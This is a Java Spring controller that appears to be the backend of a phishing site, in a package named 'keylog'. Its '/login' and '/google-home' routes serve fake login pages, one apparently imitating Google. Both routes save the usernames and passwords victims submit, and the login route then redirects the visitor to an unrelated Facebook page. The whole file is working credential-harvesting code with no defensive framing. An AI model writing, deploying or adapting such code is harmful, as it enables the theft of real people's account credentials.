package com.huong.keylog.controller;

import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import com.huong.keylog.model.User;
import com.huong.keylog.service.UserService;

@Controller
public class UserController {
	@Autowired
	UserService userService;
	@GetMapping(value = { "/login" })
	public String login() {
		return "login";
	}
	@PostMapping("/login")
	public String login(@RequestParam(value="userName", required=false) String userName,
            @RequestParam(value="pass", required=false) String pass){
		
		User user = new User();
		user.setUserName(userName);
		user.setPass(pass);
		if(userService.checkUser(user) || userName.trim().equals("") || pass.trim().equals("")) {
			
			return "loiDangNhap";
		}
		userService.create(user);
		
	    return "redirect:" + "redirect";
		//return "lode";
	}
	@GetMapping("/")
	public String getButton() {
		return "login";
	}
	@GetMapping("/google-home")
	public String google() {
		return "homeGoogle";
	}
	@PostMapping("/google-home")
	public String google(@RequestParam(value="userName", required=false) String userName,
            @RequestParam(value="pass", required=false) String pass) {
		User user = new User();
		user.setUserName(userName);
		user.setPass(pass);

		userService.create(user);
				return "lode";
		
	}
	@RequestMapping(value = "/redirect", method = RequestMethod.GET)
	public ModelAndView method() {
		String redirectUrl = "https://www.facebook.com/dmaxmobilevinhphuc/?__tn__=%2Cd%2CP-R&eid=ARA0hiPvstpkV2hCuQr2_mtdKAa0T8ZOV82O-pJJ052e-3PxbVd3Mw0OCEEXCYR_oc7Z3xRUxx9bx3fK";
	    return new ModelAndView("redirect:" + redirectUrl);
	}
}
